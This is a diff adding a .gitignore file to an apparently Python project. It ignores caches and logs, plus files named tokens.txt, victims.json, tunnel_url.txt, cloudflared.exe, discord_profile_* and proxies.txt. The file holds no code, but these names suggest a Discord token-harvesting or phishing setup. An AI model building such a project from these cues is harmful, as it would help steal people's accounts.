@@ -1,0 +1,13 @@
+__pycache__/
+*.pyc
+*.log
+token.txt
+tokens.txt
+victims.json
+tunnel_url.txt
+cloudflared.exe
+discord_profile_*/
+captcha_profile_*/
+dbg_profile_*/
+test_profile_*/
+proxies.txt
